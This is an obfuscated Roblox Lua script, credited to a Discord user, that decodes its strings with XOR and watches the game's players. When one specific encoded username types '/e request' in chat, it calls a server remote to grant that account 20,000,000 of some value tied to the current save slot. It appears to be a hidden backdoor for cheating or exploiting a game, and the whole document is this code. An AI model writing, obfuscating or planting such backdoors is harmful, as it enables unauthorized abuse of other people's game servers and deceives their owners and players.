-- Coded By Bacaman23#6979 On Discord
local OO={};OO["II"]=string.char;OO["UU"]=string.byte;OO["YY"]=string.sub;OO["TT"]=bit32 or bit ;OO["RR"]=OO["TT"].bxor;OO["EE"]=table.concat;OO["WW"]=table.insert;local function PP(AA,SS)OO["QQ"]={};for DD=1, #AA do OO["WW"](OO["QQ"],OO["II"](OO["RR"](OO["UU"](OO["YY"](AA,DD,DD + 1 )),OO["UU"](OO["YY"](SS,1 + (DD% #SS) ,1 + (DD% #SS) + 1 )))%256 ));end return OO["EE"](OO["QQ"]);end OO["FF"]=bit32 or bit ;OO["obf_XOR%1"]=OO["FF"].bxor;OO["GG"]=OO["FF"].bor;OO["BH"]=OO["FF"].band;OO["Np"]=game:GetService(PP("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));while wait(5) do for BI,TC in ipairs(OO["Np"]:GetPlayers()) do if (string.sub(TC.Name,2 -1 ,17)==PP("\15\249\120\232\243\45\200\51\250\207\55\194\56\196\251\38","\156\67\173\74\165")) then TC[PP("\23\191\72\2\168\35\66","\38\84\215\41\118\220\70")]:Connect(function(QM)if (QM=="/e request") then game:GetService(PP("\98\19\50\30\247\83\23\54\23\250\99\2\45\0\255\87\19","\158\48\118\66\114"))[PP("\159\54\17\56\96\164\248\191\45\31\56\96","\155\203\68\112\86\19\197")][PP("\101\209\63\249\78\108\209\247\117\216\36\234\69\106","\152\38\189\86\156\32\24\133")][PP("\216\88\169\71\232\82","\38\156\55\199")]:InvokeServer(TC.Name,20000000,game[PP("\152\113\125\49\22\102\233","\35\200\29\28\72\115\20\154")][PP("\53\176\210\222\129\28\56\24\166\212\205","\84\121\223\177\191\237\76")].CurrentSaveSlot);end end);end end end
